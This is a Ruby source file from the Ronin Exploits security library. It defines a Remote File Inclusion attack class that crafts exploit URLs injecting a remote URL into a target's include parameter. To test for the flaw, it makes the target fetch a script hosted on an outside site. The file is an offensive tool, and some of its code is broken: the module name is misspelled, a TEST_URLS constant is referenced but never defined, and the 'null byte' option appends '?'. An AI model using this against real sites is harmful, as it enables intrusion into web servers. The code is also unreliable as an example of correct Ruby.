#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2012 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of Ronin Exploits.
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>
#

require 'ronin/exploits/web'

require 'digest/md5'
require 'chars'

module Ronin
  module Expoits
    #
    # Represents Remote File Inclusion (RFI) attacks.
    #
    # @since 1.0.0
    #
    class RFI < Web

      # Default URL of the RFI Test script
      TEST_SCRIPTS = {
        :PHP => 'http://ronin-ruby.github.com/downloads/rfi_test.php'
      }

      # The script extensions and their languages
      EXTS = {
        '.asp'  => :ASP,
        '.aspx' => :ASP,
        '.cfm'  => :ColdFusion,
        '.cfml' => :ColdFusion,
        '.jsp'  => :JSP,
        '.php'  => :PHP,
        '.pl'   => :Perl
      }

      # Whether to terminate the LFI path with a null byte
      property :terminate, Boolean, :default => false

      #
      # The Scripting Language the URL is using.
      #
      # @return [Symbol]
      #   The name of the Scripting Language.
      #
      def script_language
        EXTS[File.extname(self.url_path)]
      end

      #
      # Creates an exploit URL which includes the remote URL.
      #
      # @param [#to_s] remote_url
      #   The remote URL to inject.
      #
      # @return [URI::HTTP]
      #   The exploit URL.
      #
      def exploit_url(remote_url,query_params={})
        if terminate?
          remote_url = "#{remote_url}?"
        end

        return super(remote_url,query_params)
      end

      #
      # Determines if the URL is vulnerable to RFI.
      #
      # @return [Boolean]
      #   Specifies whether the URL is vulnerable to RFI.
      #
      def vulnerable?
        unless TEST_URLS.has_key?(script_language)
          raise(NotImplementedError,"unable to test against #{script_language}")
        end

        challenge = Chars::ALPHA.random_string(10)
        expected  = Digest::MD5.hexdigest(challenge)
        body      = exploit(TEST_URLS[script_language], 'test' => challenge)

        return body.include?(expected)
      end

    end
  end
end
